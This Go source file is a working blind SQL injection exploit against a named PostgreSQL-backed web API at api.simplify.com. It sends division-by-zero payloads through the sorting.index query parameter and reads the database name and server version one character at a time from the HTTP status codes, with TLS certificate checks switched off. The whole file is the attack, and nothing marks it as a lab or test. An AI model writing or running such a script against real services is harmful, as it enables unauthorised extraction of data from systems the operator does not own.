package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"
)

// PostgreSQL Injection

func main() {
	GetInfo("current_database()")
	GetInfo("version()")
}

func Requester(uUrl string, method string) bool {
	isTrue := false

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: time.Second * 10,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, _ := http.NewRequest(method, uUrl, nil)
	req.Header.Set("Referer", uUrl)
	resp, err := client.Do(req)
	if resp != nil && err == nil {
		if resp.StatusCode == 200 {
			isTrue = true
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}

	return isTrue
}

func GetLen(s string) int {
	for i := 1; i < 100; i++ {
		pUrl := fmt.Sprintf("https://api.simplify.com/ss/api/web/policy?filter.enabled=true&filter.store=a6ozbe&sorting.index=,1/(%d/length(%s))", i, s)
		if Requester(pUrl, "GET") {
			fmt.Println(s, "length is  ", i)
			return i
			break
		}
	}
	return 0
}

func GetInfo(s string) {
	fmt.Println("Get " + s + "...")

	var info string
	str := "abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_."
	num := GetLen(s)
	if num == 0 {
		fmt.Println("data not found")
		return
	}

	for {
		for _, y := range str {
			pUrl := fmt.Sprintf("https://api.simplify.com/ss/api/web/policy?filter.enabled=true&filter.store=a6ozbe&sorting.index=,1/(1/strpos(%s,'%s%s'))", s, info, string(y))
			if Requester(pUrl, "GET") {
				info = info + string(y)
				fmt.Println(s, "is", info)
				break
			}
		}
		if len(info) == num {
			fmt.Println(s, "=", info)
			break
		}
	}
}
